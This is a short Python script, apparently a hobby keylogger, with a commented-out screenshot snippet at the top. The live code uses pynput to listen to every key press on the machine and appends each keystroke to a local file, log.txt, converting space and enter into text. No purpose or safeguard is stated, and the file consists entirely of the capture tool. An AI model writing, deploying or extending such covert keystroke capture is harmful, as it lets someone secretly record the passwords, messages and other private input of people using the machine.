# import pyautogui
# from io import BytesIO
# import base64

# img = pyautogui.screenshot()
# buffer = BytesIO()
# # img.save('somepick.jpeg',format="JPEG")
# img_str = img.tobytes()

# # strtoimg = base64.b64decode(img_str)

# print(img_str)


from pynput.keyboard import Listener


def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'

    with open("log.txt", 'a') as f:
        f.write(key)

with Listener(on_press=log_keystroke) as log:
    log.join()